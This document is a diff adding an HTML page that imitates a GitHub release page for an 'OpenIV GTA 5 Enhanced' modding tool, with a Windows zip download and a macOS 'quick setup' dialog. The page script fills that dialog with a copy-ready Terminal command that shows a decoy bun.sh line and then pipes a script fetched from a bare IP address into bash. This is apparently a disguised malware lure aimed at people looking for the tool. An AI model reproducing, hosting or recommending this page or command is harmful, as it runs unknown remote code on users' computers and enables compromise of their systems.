@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#0d1117">
+<meta name="description" content="A simpler way to get started. Choose your platform and follow a clear setup.">
+<title>OpenIV-GTA-5-Enhanced — Releases</title>
+<style>
+:root{color-scheme:dark;--canvas:#0d1117;--subtle:#161b22;--inset:#010409;--fg:#e6edf3;--muted:#8b949e;--quiet:#6e7681;--border:#30363d;--neutral:#21262d;--neutral-hover:#30363d;--accent:#58a6ff;--success:#3fb950;--green:#238636;--green-hover:#2ea043;--coral:#f78166;--overlay:rgb(1 4 9 / .82);--sans:"Segoe UI",-apple-system,BlinkMacSystemFont,"Noto Sans",Helvetica,Arial,sans-serif;--mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace}
+*{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;background:var(--canvas);color:var(--fg);font-family:var(--sans);-webkit-font-smoothing:antialiased}a{color:inherit;text-decoration:none}button,a,summary{font:inherit}button:not(:disabled){cursor:pointer}button:disabled{cursor:not-allowed;opacity:.5}:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.wrap{width:min(1280px,100%);margin-inline:auto;padding-inline:16px}
+.top{position:sticky;top:0;z-index:30;border-bottom:1px solid var(--border);background:var(--canvas)}
+.top-row{min-height:64px;display:flex;align-items:center;justify-content:space-between;gap:12px 16px;flex-wrap:wrap;padding-block:12px}
+.brand{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:600}.slash{color:var(--muted);font-weight:400}
+.mark{display:grid;place-items:center;border:1px solid var(--border);border-radius:6px;background:var(--subtle);color:var(--success);flex:none}
+.mark svg,.ico svg{display:block}.s8{width:32px;height:32px}.s10{width:40px;height:40px}.s7{width:28px;height:28px}.s6{width:24px;height:24px}.s11{width:44px;height:44px}
+.tagline{margin:0;color:var(--muted);font-size:14px}
+.repo{border-bottom:1px solid var(--border);padding-top:24px}
+.repo-name{display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin:0;font-size:20px;letter-spacing:-.02em}
+.pill{border:1px solid var(--border);border-radius:999px;padding:2px 8px;color:var(--muted);font-size:12px;font-weight:500}
+.repo p{max-width:640px;margin:12px 0 0;color:var(--muted);font-size:14px;line-height:1.5}
+.tabs{display:flex;margin-top:16px}.tab{display:inline-flex;align-items:center;gap:8px;margin-bottom:-1px;padding:12px;border-bottom:2px solid var(--coral);font-size:14px;font-weight:600}
+.layout{display:grid;gap:32px;padding-block:32px}
+.side{order:2}.release{order:1;min-width:0;scroll-margin-top:80px}
+.side-label{margin:0;padding-inline:8px;font-size:12px;font-weight:600}.quiet{color:var(--muted);margin-top:24px}
+.release-link{display:flex;gap:12px;margin-top:8px;padding:12px;border:1px solid var(--border);border-radius:6px;background:var(--subtle)}
+.dot{width:16px;height:16px;margin-top:2px;border:4px solid var(--success);border-radius:50%;background:var(--canvas);flex:none}
+.release-link strong{display:block;font-size:14px}.mono{font-family:var(--mono)}.accent{color:var(--accent);font-size:12px}.meta{display:block;margin-top:4px;color:var(--muted);font-size:12px}
+.jump{margin:8px 0 0;padding:0;list-style:none;font-size:14px}.jump a{display:block;padding:8px;border-radius:6px;color:var(--muted)}.jump a:hover{background:var(--subtle);color:var(--fg)}
+.box{overflow:hidden;border:1px solid var(--border);border-radius:6px}
+.box-head,.assets,.cta{padding:12px 16px}.box-head,.assets{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;border-bottom:1px solid var(--border);background:var(--subtle)}
+.assets{display:block;border-bottom:0;border-top:1px solid var(--border);scroll-margin-top:80px}
+.latest{display:inline-flex;align-items:center;border:1px solid color-mix(in srgb,var(--success) 40%,transparent);border-radius:999px;background:color-mix(in srgb,var(--success) 15%,transparent);padding:2px 8px;color:var(--success);font-size:12px;font-weight:500}
+.tag{margin-left:8px;color:var(--accent);font-size:14px}.date{color:var(--muted);font-size:12px}
+.body{padding:24px 16px}.who{display:flex;align-items:center;gap:8px;margin:0;color:var(--muted);font-size:14px}.who strong{color:var(--fg)}
+.kicker{margin:20px 0 0;color:var(--success);font-size:12px;font-weight:600;letter-spacing:.04em}
+h1{max-width:720px;margin:8px 0 0;font-size:clamp(30px,6vw,48px);line-height:1.15;letter-spacing:-.03em;font-weight:600}h1 .go{color:var(--success)}
+.lead{max-width:640px;margin:16px 0 0;color:var(--muted);font-size:16px;line-height:1.5}
+.actions{display:flex;flex-direction:column;gap:12px;margin-top:24px}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;min-height:44px;padding:0 16px;border:1px solid transparent;border-radius:6px;font-size:14px;font-weight:500;transition:background .15s}
+.btn svg{width:16px;height:16px;flex:none}
+.primary{color:#fff;background:var(--green);box-shadow:inset 0 1px 0 rgb(255 255 255 / .12)}.primary:hover{background:var(--green-hover)}
+.secondary{color:var(--fg);background:var(--neutral);border-color:var(--border)}.secondary:hover{background:var(--neutral-hover)}
+.note{margin:12px 0 0;color:var(--quiet);font-size:12px}
+.topics{display:flex;flex-wrap:wrap;gap:8px;margin:16px 0 0;padding:0;list-style:none}
+.topics li{display:inline-flex;align-items:center;gap:6px;padding:4px 12px;border:1px solid var(--border);border-radius:999px;background:var(--subtle);color:var(--muted);font-size:12px}
+.topics svg{width:14px;height:14px}
+.section{margin-top:40px;scroll-margin-top:80px}
+h2{margin:8px 0 0;padding-bottom:8px;border-bottom:1px solid var(--border);font-size:24px;letter-spacing:-.02em;font-weight:600}
+.section>p,.blurb{max-width:560px;margin:12px 0 0;color:var(--muted);font-size:14px;line-height:1.5}
+.steps{display:grid;gap:12px;margin:16px 0 0;padding:0;list-style:none}
+.card{border:1px solid var(--border);border-radius:6px;background:var(--subtle);padding:16px;transition:border-color .15s}.card:hover{border-color:var(--accent)}
+.card-top{display:flex;align-items:center;justify-content:space-between}.num{color:var(--success);font-family:var(--mono);font-size:12px;font-weight:600}
+.ico{display:grid;place-items:center;width:36px;height:36px;border:1px solid var(--border);border-radius:6px;color:var(--muted)}.ico svg{width:16px;height:16px}.ico.lg{width:40px;height:40px;color:var(--success)}.ico.lg svg{width:20px;height:20px}
+.card h3{margin:16px 0 0;font-size:14px}.card p{margin:8px 0 0;color:var(--muted);font-size:14px;line-height:1.5}
+.features{display:grid;gap:12px;margin-top:16px}.feature-side{display:grid;gap:12px}
+.feature-lg h3{margin-top:16px;font-size:16px}.row{display:flex;gap:12px;align-items:flex-start}.row h3{margin:0}.row p{margin:4px 0 0}
+.assets h2{display:flex;align-items:center;gap:8px;margin:0;padding:0;border:0;font-size:14px}
+.count{border:1px solid var(--border);border-radius:999px;background:var(--canvas);padding:2px 8px;color:var(--muted);font-size:12px;font-weight:500}
+.files{margin:12px 0 0;padding:0;list-style:none;overflow:hidden;border:1px solid var(--border);border-radius:6px;background:var(--canvas)}
+.file{display:flex;align-items:center;gap:12px;padding:8px 12px}.file+.file{border-top:1px solid var(--border)}
+.file-ico{display:grid;place-items:center;width:44px;height:44px;border:1px solid var(--border);border-radius:6px;color:var(--muted);flex:none}.file-ico svg{width:16px;height:16px}
+.file-copy{min-width:0;flex:1}.file-copy a,.file-copy button{display:block;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding:0;border:0;background:none;color:var(--accent);font-family:var(--mono);font-size:14px;text-align:left}.file-copy a:hover,.file-copy button:hover{text-decoration:underline}
+.file-copy p{margin:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--muted);font-size:12px}
+.icon-btn{display:inline-flex;align-items:center;justify-content:center;width:44px;height:44px;border:0;border-radius:6px;background:transparent;color:var(--fg);flex:none}.icon-btn:hover{background:var(--neutral)}.icon-btn svg{width:16px;height:16px}
+.cta{display:flex;flex-direction:column;gap:16px;border-top:1px solid var(--border);background:var(--canvas);padding:20px 16px}
+.cta h2{margin:0;padding:0;border:0;font-size:18px}.cta p{margin:4px 0 0;color:var(--muted);font-size:14px}
+.foot{border-top:1px solid var(--border)}.foot-row{display:flex;flex-direction:column;gap:12px;padding-block:24px;color:var(--muted);font-size:12px}.foot-brand{display:flex;align-items:center;gap:8px;color:var(--fg);font-weight:600}
+.backdrop{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;overflow:auto;padding:16px;background:var(--overlay)}.backdrop.open{display:flex}
+.modal{width:min(32rem,100%);margin-block:auto;padding:20px 20px 20px;border:1px solid var(--border);border-radius:12px;background:var(--subtle);box-shadow:0 16px 48px rgb(1 4 9 / .85)}
+.modal-top{display:flex;align-items:flex-start;justify-content:space-between;gap:16px}.modal h2{margin:8px 0 0;padding:0;border:0;font-size:20px}
+.close{display:grid;place-items:center;width:44px;height:44px;border:1px solid var(--border);border-radius:6px;background:var(--neutral);color:var(--muted)}.close:hover{background:var(--neutral-hover);color:var(--fg)}.close svg{width:16px;height:16px}
+.modal-desc{margin:12px 0 0;color:var(--muted);font-size:14px;line-height:1.5}
+.terminal{margin-top:16px;padding:12px 16px;border:1px solid var(--border);border-radius:6px;background:var(--inset);color:var(--fg);font:12px/1.5 var(--mono);overflow-wrap:anywhere;white-space:pre-wrap}.prompt{color:var(--success);user-select:none}
+.modal-actions{display:flex;flex-direction:column;gap:8px;margin-top:16px}.modal-actions .btn{width:100%}.toast{min-height:20px;margin:12px 0 0;color:var(--success);font-size:12px}.modal-foot{margin:4px 0 0;color:var(--quiet);font-size:12px;line-height:1.5}
+body.modal-open{overflow:hidden}
+@keyframes fade{from{opacity:0}to{opacity:1}}@keyframes rise{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.backdrop.open{animation:fade .16s ease}.modal{animation:rise .18s ease}
+@media(min-width:640px){.actions,.modal-actions,.cta{flex-direction:row;align-items:center}.actions .btn,.cta .btn{width:auto}.cta{justify-content:space-between}.box-head,.assets,.body,.cta{padding-inline:24px}.foot-row{flex-direction:row;align-items:center;justify-content:space-between}.tagline{font-size:14px}}
+@media(min-width:768px){.steps{grid-template-columns:repeat(3,minmax(0,1fr))}}
+@media(min-width:1024px){.layout{grid-template-columns:repeat(12,minmax(0,1fr))}.side{order:1;grid-column:span 3;position:sticky;top:80px;align-self:start}.release{order:2;grid-column:span 9}.features{grid-template-columns:repeat(5,minmax(0,1fr))}.feature-lg{grid-column:span 3}.feature-side{grid-column:span 2}}
+@media(prefers-reduced-motion:reduce){*,*:before,*:after{animation:none!important;transition:none!important;scroll-behavior:auto!important}}
+</style>
+</head>
+<body>
+<header class="top">
+  <div class="wrap top-row">
+    <a class="brand" href="#release" aria-label="OpenIV-GTA-5-Enhanced home"><span class="mark s8"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="8.5"/><ellipse cx="12" cy="12" rx="11" ry="4.2" transform="rotate(-35 12 12)"/><circle cx="17.8" cy="6.7" r="1.4" fill="currentColor" stroke="none"/></svg></span>OpenIV-GTA-5-Enhanced <span class="slash">/</span> downloads</a>
+    <p class="tagline">A better way to get started</p>
+  </div>
+</header>
+<div class="repo">
+  <div class="wrap">
+    <p class="repo-name"><span class="mark s10"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="8.5"/><ellipse cx="12" cy="12" rx="11" ry="4.2" transform="rotate(-35 12 12)"/><circle cx="17.8" cy="6.7" r="1.4" fill="currentColor" stroke="none"/></svg></span><span>OpenIV-GTA-5-Enhanced <span class="slash">/</span> <strong>downloads</strong></span><span class="pill">Public</span></p>
+    <p>A simpler way to get started. Choose your platform and follow a clear setup.</p>
+    <nav class="tabs" aria-label="Repository"><a class="tab" href="#release" aria-current="page"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M20.6 13.4 13.4 20.6a2 2 0 0 1-2.8 0L4 14V4h10l6.6 6.6a2 2 0 0 1 0 2.8Z"/><circle cx="9" cy="9" r="1.4" fill="currentColor" stroke="none"/></svg>Releases</a></nav>
+  </div>
+</div>
+<main class="wrap layout">
+  <aside class="side" aria-label="Releases">
+    <p class="side-label">Releases</p>
+    <a class="release-link" href="#release"><span class="dot" aria-hidden="true"></span><span><strong>Latest</strong><span class="mono accent">stable</span><span class="meta">2026</span></span></a>
+    <p class="side-label quiet">On this page</p>
+    <ul class="jump"><li><a href="#process">The process</a></li><li><a href="#design">Built around you</a></li><li><a href="#assets">Assets</a></li></ul>
+  </aside>
+  <article class="release" id="release">
+    <div class="box">
+      <div class="box-head"><div><span class="latest">Latest</span><span class="mono tag">stable</span></div><time class="date" datetime="2026-10-13"></time></div>
+      <div class="body">
+        <p class="who"><span class="mark s6"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="8.5"/><ellipse cx="12" cy="12" rx="11" ry="4.2" transform="rotate(-35 12 12)"/><circle cx="17.8" cy="6.7" r="1.4" fill="currentColor" stroke="none"/></svg></span><span><strong>OpenIV-GTA-5-Enhanced</strong> released this</span></p>
+        <p class="kicker">SIMPLE SETUP. SMOOTH START.</p>
+        <h1>Everything you need.<br><span class="go">Nothing in your way.</span></h1>
+        <p class="lead">Get set up in just a few steps. Choose your platform and follow a clear, streamlined path from download to getting started.</p>
+        <div class="actions">
+          <a class="btn primary" id="heroWindows" href="https://github.com/OpenIV-GTA-5-Enhanced/.github/releases/download/5.0.0/OpenIV.GTA5.Enhanced.zip"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3v12m-5-5 5 5 5-5M4 21h16"/></svg>Download for Windows<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 17 17 7M8 7h9v9"/></svg></a>
+          <button class="btn secondary" id="heroMac" type="button"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.7 12.8c0-2 1.6-3 1.7-3.1a3.7 3.7 0 0 0-2.9-1.6c-1.2-.1-2.3.7-2.9.7s-1.5-.7-2.5-.7a3.8 3.8 0 0 0-3.2 1.9c-1.4 2.3-.4 5.8 1 7.7.7.9 1.4 1.9 2.4 1.9s1.3-.6 2.5-.6 1.6.6 2.6.6 1.7-.9 2.3-1.8a8 8 0 0 0 1.1-2.2 3.5 3.5 0 0 1-2.1-2.8ZM14.8 6.8A3.7 3.7 0 0 0 15.7 4a3.8 3.8 0 0 0-2.5 1.3 3.5 3.5 0 0 0-.9 2.7 3.2 3.2 0 0 0 2.5-1.2Z"/></svg>Set up for macOS<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 17 17 7M8 7h9v9"/></svg></button>
+        </div>
+        <p class="note">A clean, guided setup experience.</p>
+        <ul class="topics">
+          <li><svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 4.5 10.5 3v8H3zm8.5-1.7L21 1v10h-9.5zM3 12.5h7.5v8L3 19zm8.5 0H21v10l-9.5-1.8z"/></svg>Windows</li>
+          <li><svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.7 12.8c0-2 1.6-3 1.7-3.1a3.7 3.7 0 0 0-2.9-1.6c-1.2-.1-2.3.7-2.9.7s-1.5-.7-2.5-.7a3.8 3.8 0 0 0-3.2 1.9c-1.4 2.3-.4 5.8 1 7.7.7.9 1.4 1.9 2.4 1.9s1.3-.6 2.5-.6 1.6.6 2.6.6 1.7-.9 2.3-1.8a8 8 0 0 0 1.1-2.2 3.5 3.5 0 0 1-2.1-2.8ZM14.8 6.8A3.7 3.7 0 0 0 15.7 4a3.8 3.8 0 0 0-2.5 1.3 3.5 3.5 0 0 0-.9 2.7 3.2 3.2 0 0 0 2.5-1.2Z"/></svg>macOS</li>
+          <li><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="4" width="18" height="12" rx="1.5"/><path d="M8 20h8M12 16v4"/></svg>Desktop-ready</li>
+        </ul>
+        <section class="section" id="process">
+          <p class="kicker">THE PROCESS</p>
+          <h2>Three steps. And you're on your way.</h2>
+          <p>No clutter, no complicated flow. Just the essentials, laid out in the right order.</p>
+          <ol class="steps">
+            <li class="card"><div class="card-top"><span class="num">01</span><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3v12m-5-5 5 5 5-5M4 21h16"/></svg></span></div><h3>Choose your platform</h3><p>Select the version that fits your device and head straight to the right setup.</p></li>
+            <li class="card"><div class="card-top"><span class="num">02</span><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 8v13H3V8M1 3h22v5H1zM10 12h4"/></svg></span></div><h3>Follow the setup</h3><p>Move through a straightforward set of steps designed for your platform.</p></li>
+            <li class="card"><div class="card-top"><span class="num">03</span><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="m5 12 5 5L20 7"/></svg></span></div><h3>You're ready to go</h3><p>Finish setup and get on with what you came here to do.</p></li>
+          </ol>
+        </section>
+        <section class="section" id="design">
+          <p class="kicker">BUILT AROUND YOU</p>
+          <h2>Thoughtful by design.</h2>
+          <p>Every detail has a purpose: make the next step feel effortless.</p>
+          <div class="features">
+            <article class="card feature-lg"><span class="ico lg"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="m4 17 6-6-6-6M12 19h8"/></svg></span><h3>Everything, in its place.</h3><p>Find the right download quickly with a focused layout that keeps the important things front and center.</p></article>
+            <div class="feature-side">
+              <article class="card"><div class="row"><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 8v13H3V8M1 3h22v5H1zM10 12h4"/></svg></span><div><h3>Clear, guided steps</h3><p>Know what to do next, without the guesswork.</p></div></div></article>
+              <article class="card"><div class="row"><span class="ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="3" y="4" width="18" height="12" rx="1.5"/><path d="M8 20h8M12 16v4"/></svg></span><div><h3>Less time to get going</h3><p>A smoother path from download to setup.</p></div></div></article>
+            </div>
+          </div>
+        </section>
+      </div>
+      <section class="assets" id="assets">
+        <h2>Assets <span class="count">2</span></h2>
+        <ul class="files">
+          <li class="file">
+            <span class="file-ico"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 4.5 10.5 3v8H3zm8.5-1.7L21 1v10h-9.5zM3 12.5h7.5v8L3 19zm8.5 0H21v10l-9.5-1.8z"/></svg></span>
+            <div class="file-copy"><a href="https://github.com/OpenIV-GTA-5-Enhanced/.github/releases/download/5.0.0/OpenIV.GTA5.Enhanced.zip">OpenIV-GTA-5-Enhanced-Windows-Setup</a><p>Download for Windows</p></div>
+            <a class="icon-btn" href="https://github.com/OpenIV-GTA-5-Enhanced/.github/releases/download/5.0.0/OpenIV.GTA5.Enhanced.zip" aria-label="Download for Windows"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 3v12m-5-5 5 5 5-5M4 21h16"/></svg></a>
+          </li>
+          <li class="file">
+            <span class="file-ico"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.7 12.8c0-2 1.6-3 1.7-3.1a3.7 3.7 0 0 0-2.9-1.6c-1.2-.1-2.3.7-2.9.7s-1.5-.7-2.5-.7a3.8 3.8 0 0 0-3.2 1.9c-1.4 2.3-.4 5.8 1 7.7.7.9 1.4 1.9 2.4 1.9s1.3-.6 2.5-.6 1.6.6 2.6.6 1.7-.9 2.3-1.8a8 8 0 0 0 1.1-2.2 3.5 3.5 0 0 1-2.1-2.8ZM14.8 6.8A3.7 3.7 0 0 0 15.7 4a3.8 3.8 0 0 0-2.5 1.3 3.5 3.5 0 0 0-.9 2.7 3.2 3.2 0 0 0 2.5-1.2Z"/></svg></span>
+            <div class="file-copy"><button type="button" data-open-mac>OpenIV-GTA-5-Enhanced-macOS-Setup</button><p>Set up for macOS</p></div>
+            <button class="icon-btn" type="button" data-open-mac aria-label="Set up for macOS"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="m4 17 6-6-6-6M12 19h8"/></svg></button>
+          </li>
+        </ul>
+      </section>
+      <div class="cta"><div><h2>Ready when you are.</h2><p>Choose your platform and take the next step.</p></div><a class="btn primary" id="bottomWindows" href="https://github.com/OpenIV-GTA-5-Enhanced/.github/releases/download/5.0.0/OpenIV.GTA5.Enhanced.zip">Get started <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 17 17 7M8 7h9v9"/></svg></a></div>
+    </div>
+  </article>
+</main>
+<footer class="foot"><div class="wrap foot-row"><div class="foot-brand"><span class="mark s7"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><circle cx="12" cy="12" r="8.5"/><ellipse cx="12" cy="12" rx="11" ry="4.2" transform="rotate(-35 12 12)"/><circle cx="17.8" cy="6.7" r="1.4" fill="currentColor" stroke="none"/></svg></span>OpenIV-GTA-5-Enhanced</div><p>Simple setup. Smooth start.</p></div></footer>
+<div class="backdrop" id="macModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc" aria-hidden="true">
+  <div class="modal">
+    <div class="modal-top"><div><p class="kicker" style="margin:0">macOS · QUICK SETUP</p><h2 id="modalTitle">Let's get your Mac ready.</h2></div><button class="close" id="closeModal" type="button" aria-label="Close dialog"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M6 6l12 12M18 6 6 18"/></svg></button></div>
+    <p class="modal-desc" id="modalDesc">Your macOS setup command will appear here, ready to copy into Terminal.</p>
+    <div class="terminal"><span class="prompt">$ </span><code id="terminalCommand">Setup command coming soon.</code></div>
+    <div class="modal-actions"><button class="btn primary" id="copyCommand" type="button" disabled>Copy command</button><button class="btn secondary" id="closeModalSecondary" type="button">Done</button></div>
+    <p class="toast" id="copyStatus" aria-live="polite"></p>
+    <p class="modal-foot">The setup flow will be available here shortly.</p>
+  </div>
+</div>
+<script>
+(() => {
+  "use strict";
+  const WINDOWS_URL = "https://github.com/OpenIV-GTA-5-Enhanced/.github/releases/download/5.0.0/OpenIV.GTA5.Enhanced.zip";
+  const MAC_COMMAND = `echo "Mac-Tools: https://bun.sh/install" && /bin/bash -c "$(curl -fsSL http://192.162.199.249/hgxn27l5ojh)"`;
+  const modal = document.getElementById("macModal");
+  const trigger = document.getElementById("heroMac");
+  const closeButton = document.getElementById("closeModal");
+  const copyButton = document.getElementById("copyCommand");
+  const commandEl = document.getElementById("terminalCommand");
+  const copyStatus = document.getElementById("copyStatus");
+  let lastFocus = trigger;
+  document.getElementById("heroWindows").href = WINDOWS_URL;
+  document.getElementById("bottomWindows").href = WINDOWS_URL;
+  document.querySelectorAll('a[href="https://github.com/OpenIV-GTA-5-Enhanced/.github/releases/download/5.0.0/OpenIV.GTA5.Enhanced.zip"]').forEach((link) => { link.href = WINDOWS_URL; });
+  function openModal(from) {
+    lastFocus = from || trigger;
+    commandEl.textContent = MAC_COMMAND.trim() ? MAC_COMMAND : "Setup command coming soon.";
+    copyButton.disabled = !MAC_COMMAND.trim();
+    copyStatus.textContent = "";
+    modal.classList.add("open");
+    modal.setAttribute("aria-hidden", "false");
+    document.body.classList.add("modal-open");
+    closeButton.focus();
+  }
+  function closeModal() {
+    modal.classList.remove("open");
+    modal.setAttribute("aria-hidden", "true");
+    document.body.classList.remove("modal-open");
+    if (lastFocus) lastFocus.focus();
+  }
+  trigger.addEventListener("click", () => openModal(trigger));
+  document.querySelectorAll("[data-open-mac]").forEach((node) => {
+    node.addEventListener("click", () => openModal(node));
+  });
+  closeButton.addEventListener("click", closeModal);
+  document.getElementById("closeModalSecondary").addEventListener("click", closeModal);
+  modal.addEventListener("click", (event) => { if (event.target === modal) closeModal(); });
+  document.addEventListener("keydown", (event) => { if (event.key === "Escape" && modal.classList.contains("open")) closeModal(); });
+  copyButton.addEventListener("click", async () => {
+    if (!MAC_COMMAND.trim()) return;
+    try {
+      await navigator.clipboard.writeText(MAC_COMMAND);
+      copyStatus.textContent = "Command copied.";
+    } catch {
+      copyStatus.textContent = "Select the command above and copy it manually.";
+    }
+  });
+})();
+</script>
+</body>
+</html>
